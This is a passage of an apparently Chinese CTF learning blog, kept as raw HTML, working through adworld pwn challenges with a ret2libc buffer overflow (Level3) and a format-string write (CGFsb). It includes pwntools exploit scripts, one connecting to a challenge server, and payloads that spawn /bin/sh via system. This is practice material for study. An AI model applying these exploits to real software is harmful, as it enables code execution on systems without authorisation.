</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>b</span><span class=sc>&#39;a&#39;</span><span class=o>*</span><span class=mi>91</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=n>bin_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;please tell me your name&#34;</span><span class=p>,</span> <span class=err>&#39;</span><span class=n>cat</span> <span class=n>flag</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;hello,you can leave some message here:&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h1 id=level3未果>Level3(未果)</h1><p>这种题目直接放弃了，文件都打不开，没见过这类题目=-=原来是要两次解压</p><p>而且tar -xzvf是解压tar.gz，tar文件指令是tar -xvf</p><h2 id=write函数>Write函数</h2><p><a href=https://zh.wikipedia.org/wiki/%E5%86%99%E5%85%A5>Write函数</a></p><p><a href="https://www.notion.so/eec8831023b0466d952c8bf45b101e0b?pvs=21">Write函数ssize_t write(int fd, const void *buf, size_t nbytes);</a></p><h2 id=分文件分析>分文件分析</h2><p>两次解压之后得到level3和libc_32.so.6文件，直接拖入IDA</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>vincebye</span><span class=err>@</span><span class=nl>ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld</span><span class=o>/</span><span class=n>level3</span><span class=err>$</span> <span class=n>checksec</span> <span class=n>level3</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>vincebye</span><span class=o>/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld</span><span class=o>/</span><span class=n>level3</span><span class=o>/</span><span class=n>level3</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nl>Arch</span><span class=p>:</span>     <span class=n>i386</span><span class=o>-</span><span class=mi>32</span><span class=o>-</span><span class=n>little</span>
</span></span><span class=line><span class=cl>    <span class=nl>RELRO</span><span class=p>:</span>    <span class=n>Partial</span> <span class=n>RELRO</span>
</span></span><span class=line><span class=cl>    <span class=nl>Stack</span><span class=p>:</span>    <span class=n>No</span> <span class=n>canary</span> <span class=n>found</span>
</span></span><span class=line><span class=cl>    <span class=nl>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
</span></span><span class=line><span class=cl>    <span class=nl>PIE</span><span class=p>:</span>      <span class=n>No</span> <span class=nf>PIE</span> <span class=p>(</span><span class=mh>0x8048000</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=level3文件>level3文件</h3><p>main函数代码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>vulnerable_function</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Hello, World!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mh>0xEu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>vulnerable_function函数代码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>vulnerable_function</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-88h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Input:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>7u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x100u</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>vulnerable_function函数很明显存在溢出，但是问题没有类似system的函数来执行我们的命令</p><p>有用的字符串也是没有</p><p><img src=https://s3-us-west-2.amazonaws.com/secure.notion-static.com/597e7541-78c2-4843-98b0-bf6faf948b5c/Untitled.png alt=Untitled></p><h3 id=libc_32so6>libc_32.so.6</h3><p>在此可以找到system函数，地址为0003A940</p><p><img src=https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6b52d47a-5b6b-45ce-9f12-f8c66e63c42c/Untitled.png alt=Untitled></p><p>利用r2查找的libc_32.so.6中的字符串(IDA自带的字符串功能好像不太行</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>[</span><span class=mh>0x000187c0</span><span class=p>]</span><span class=o>&gt;</span> <span class=n>iz</span><span class=o>|</span><span class=n>grep</span> <span class=n>bin</span>
</span></span><span class=line><span class=cl><span class=mi>267</span>  <span class=mh>0x0014f92f</span> <span class=mh>0x0014f92f</span> <span class=mi>5</span>   <span class=mi>7</span>    <span class=p>.</span><span class=n>rodata</span>                                           <span class=n>utf8</span>    <span class=o>+</span><span class=err>\</span><span class=n>f</span><span class=err>͗</span><span class=mi>20</span> <span class=n>blocks</span><span class=o>=</span><span class=n>Basic</span> <span class=n>Latin</span><span class=p>,</span><span class=n>Combining</span> <span class=n>Diacritical</span> <span class=n>Marks</span>
</span></span><span class=line><span class=cl><span class=mi>414</span>  <span class=mh>0x00152307</span> <span class=mh>0x00152307</span> <span class=mi>7</span>   <span class=mi>11</span>   <span class=p>.</span><span class=n>rodata</span>                                           <span class=n>utf8</span>    <span class=n>U</span><span class=err>͚</span><span class=n>Vx9</span><span class=err>ꖖ</span><span class=p>(</span> <span class=n>blocks</span><span class=o>=</span><span class=n>Basic</span> <span class=n>Latin</span><span class=p>,</span><span class=n>Combining</span> <span class=n>Diacritical</span> <span class=n>Marks</span><span class=p>,</span><span class=n>Vai</span>
</span></span><span class=line><span class=cl><span class=mi>708</span>  <span class=mh>0x0015902b</span> <span class=mh>0x0015902b</span> <span class=mi>7</span>   <span class=mi>8</span>    <span class=p>.</span><span class=n>rodata</span>                                           <span class=n>ascii</span>   <span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=mi>936</span>  <span class=mh>0x00159f7b</span> <span class=mh>0x00159f7b</span> <span class=mi>28</span>  <span class=mi>29</span>   <span class=p>.</span><span class=n>rodata</span>                                           <span class=n>ascii</span>   <span class=n>invalid</span> <span class=n>fastbin</span> <span class=nf>entry</span> <span class=p>(</span><span class=n>free</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1163</span> <span class=mh>0x0015abac</span> <span class=mh>0x0015abac</span> <span class=mi>8</span>   <span class=mi>9</span>    <span class=p>.</span><span class=n>rodata</span>                                           <span class=n>ascii</span>   <span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>csh</span>
</span></span><span class=line><span class=cl><span class=mi>1520</span> <span class=mh>0x0015bf90</span> <span class=mh>0x0015bf90</span> <span class=mi>27</span>  <span class=mi>28</span>   <span class=p>.</span><span class=n>rodata</span>                                           <span class=n>ascii</span>   <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>bindresvport</span><span class=p>.</span><span class=n>blacklist</span>
</span></span><span class=line><span class=cl><span class=mi>1718</span> <span class=mh>0x0015d858</span> <span class=mh>0x0015d858</span> <span class=mi>47</span>  <span class=mi>48</span>   <span class=p>.</span><span class=n>rodata</span>                                           <span class=n>ascii</span>   <span class=nf>malloc</span><span class=p>()</span><span class=o>:</span> <span class=n>smallbin</span> <span class=kt>double</span> <span class=n>linked</span> <span class=n>list</span> <span class=n>corrupted</span>
</span></span><span class=line><span class=cl><span class=mi>1828</span> <span class=mh>0x0015e86c</span> <span class=mh>0x0015e86c</span> <span class=mi>13</span>  <span class=mi>14</span>   <span class=p>.</span><span class=n>rodata</span>                                           <span class=n>ascii</span>   <span class=o>/</span><span class=nl>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span>
</span></span></code></pre></div><h2 id=总>总</h2><p>根据保护机制知道一部分地址是会随机化的，也就是说libc中的地址会随机化，但是加载到level3文件中的相对地址是不变的,我们就可以求出其中一个函数的在level3中的地址，然后减去在libc中的地址，就可以知道整个so文件在level3文件中的偏移，其他的地址也就都知道了</p><h2 id=exp>EXP</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;level3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;libc_32.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;level3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>write_plt</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>write_got</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>main_addr</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=mh>0x88</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>write_plt</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>main_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>write_got</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Input:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#获得的write的GOT地址</span>
</span></span><span class=line><span class=cl><span class=n>write_got_addr</span><span class=o>=</span><span class=n>u32</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>libc_offset</span><span class=o>=</span><span class=n>write_got_addr</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;libc_offset&gt;&gt;&gt;&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_offset</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#system函数地址</span>
</span></span><span class=line><span class=cl><span class=n>system_got_addr</span><span class=o>=</span><span class=n>libc_offset</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;system_got_addr&gt;&gt;&gt;&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>system_got_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#字符串地址</span>
</span></span><span class=line><span class=cl><span class=n>bin_addr</span><span class=o>=</span><span class=mh>0x0015902b</span><span class=o>+</span><span class=n>libc_offset</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;bin_addr&gt;&gt;&gt;&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>bin_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#这个system是plt地址？还是需要函数返回地址</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=mi>140</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>system_got_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>bin_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>str1</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;str1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>str1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>str2</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;str2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>str2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>但是Python3下这个一直出错，导致无法执行shell,先用以下代码代替，事先求出libc_offset地址</p><p>不知道为什么按照WP一模一样的代码也是无法执行</p><p>ELF对象.sym与got和plt的区别？</p><h1 id=cgfsb>CGFsb</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>int</span> <span class=n>__cdecl</span> <span class=n>main</span><span class=p>(</span><span class=nb>int</span> <span class=n>argc</span><span class=p>,</span> <span class=n>const</span> <span class=n>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=n>const</span> <span class=n>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nb>int</span> <span class=n>result</span><span class=p>;</span> <span class=o>//</span> <span class=n>eax</span><span class=o>@</span><span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=nb>int</span> <span class=n>v4</span><span class=p>;</span> <span class=o>//</span> <span class=n>esi</span><span class=o>@</span><span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=nb>int</span> <span class=n>v5</span><span class=p>;</span> <span class=o>//</span> <span class=p>[</span><span class=n>sp</span><span class=o>+</span><span class=mi>1</span><span class=n>Eh</span><span class=p>]</span> <span class=p>[</span><span class=n>bp</span><span class=o>-</span><span class=mi>7</span><span class=n>Eh</span><span class=p>]</span><span class=o>@</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=nb>int</span> <span class=n>v6</span><span class=p>;</span> <span class=o>//</span> <span class=p>[</span><span class=n>sp</span><span class=o>+</span><span class=mi>22</span><span class=n>h</span><span class=p>]</span> <span class=p>[</span><span class=n>bp</span><span class=o>-</span><span class=mi>7</span><span class=n>Ah</span><span class=p>]</span><span class=o>@</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=n>__int16</span> <span class=n>v7</span><span class=p>;</span> <span class=o>//</span> <span class=p>[</span><span class=n>sp</span><span class=o>+</span><span class=mi>26</span><span class=n>h</span><span class=p>]</span> <span class=p>[</span><span class=n>bp</span><span class=o>-</span><span class=mi>76</span><span class=n>h</span><span class=p>]</span><span class=o>@</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=nb>int</span> <span class=n>v8</span><span class=p>;</span> <span class=o>//</span> <span class=p>[</span><span class=n>sp</span><span class=o>+</span><span class=mi>28</span><span class=n>h</span><span class=p>]</span> <span class=p>[</span><span class=n>bp</span><span class=o>-</span><span class=mi>74</span><span class=n>h</span><span class=p>]</span><span class=o>@</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=nb>int</span> <span class=n>v9</span><span class=p>;</span> <span class=o>//</span> <span class=p>[</span><span class=n>sp</span><span class=o>+</span><span class=mi>8</span><span class=n>Ch</span><span class=p>]</span> <span class=p>[</span><span class=n>bp</span><span class=o>-</span><span class=mi>10</span><span class=n>h</span><span class=p>]</span><span class=o>@</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=o>*</span><span class=n>MK_FP</span><span class=p>(</span><span class=n>__GS__</span><span class=p>,</span> <span class=mi>20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>setbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v8</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x64</span><span class=n>u</span><span class=p>);</span><span class=c1>#v8大小:0x64</span>
</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s2>&#34;please tell me your name:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v5</span><span class=p>,</span> <span class=mh>0xA</span><span class=n>u</span><span class=p>);</span><span class=c1>#从输入流取前0xA个字符赋值给v5</span>
</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s2>&#34;leave your message please:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fgets</span><span class=p>((</span><span class=n>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v8</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span><span class=c1>#从输入流取100个字符输入到v8</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;hello </span><span class=si>%s</span><span class=s2>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s2>&#34;your message is:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>((</span><span class=n>const</span> <span class=n>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>pwnme</span> <span class=o>==</span> <span class=mi>8</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s2>&#34;you pwned me, here is your flag:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s2>&#34;cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s2>&#34;Thank you!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=o>*</span><span class=n>MK_FP</span><span class=p>(</span><span class=n>__GS__</span><span class=p>,</span> <span class=mi>20</span><span class=p>)</span> <span class=o>^</span> <span class=n>v9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>不会做，不会做</p><p>pwnme在.bss区，如何利用printf修改,看了几个人家写的博客，没太看得懂，感觉基础真的太差了，直接看答案吧</p><p>和String答案类似，利用%N$n($n用来写入、$p用来读取)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>vincebye</span><span class=nd>@ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld</span><span class=o>/</span><span class=n>cgfsb</span><span class=err>$</span> <span class=n>cgfsb</span>
</span></span><span class=line><span class=cl><span class=n>please</span> <span class=n>tell</span> <span class=n>me</span> <span class=n>your</span> <span class=n>name</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>vincebye</span>
</span></span><span class=line><span class=cl><span class=n>leave</span> <span class=n>your</span> <span class=n>message</span> <span class=n>please</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>AAAA</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>hello</span> <span class=n>vincebye</span>
</span></span><span class=line><span class=cl><span class=n>your</span> <span class=n>message</span> <span class=ow>is</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>AAAA</span><span class=o>-</span><span class=mh>0xff8954de</span><span class=o>-</span><span class=mh>0xf7f4d5c0</span><span class=o>-</span><span class=mh>0xff89552c</span><span class=o>-</span><span class=mh>0xf7f93a9c</span><span class=o>-</span><span class=mh>0x1</span><span class=o>-</span><span class=mh>0xf7f66410</span><span class=o>-</span><span class=mh>0x69760001</span><span class=o>-</span><span class=mh>0x6265636e</span><span class=o>-</span><span class=mh>0xa6579</span><span class=o>-</span><span class=mh>0x41414141</span><span class=o>-</span><span class=mh>0x2d70252d0</span><span class=n>x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span><span class=o>-</span><span class=mh>0x2d70252d</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x2d702570</span><span class=o>-</span><span class=mh>0x252d7025</span><span class=o>-</span><span class=mh>0x70252d70</span>
</span></span><span class=line><span class=cl><span class=n>Thank</span> <span class=n>you</span><span class=err>!</span>
</span></span></code></pre></div><p>前面的AAAA是为了定位，可见AAAA(0x41414141）在偏移为10的地方，现在我们将AAAA替换为pwnme的地址，然后利用printf的%10$n在第十个参数的位置写入8，就能完成任务，代码如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s2>&#34;./cgfsb&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s1>&#39;111.200.241.244&#39;</span><span class=p>,</span><span class=s1>&#39;63663&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x0804A068</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;aaaa&#39;</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;%10$n&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;please tell me your name:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;vincebye&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;your message is:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span><span class=c1>#后修改为p.sendlineafter(&#39;\n&#39;,payload),传输中可能缺少错误一两个字符或者格式编码不同，导致阻塞</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
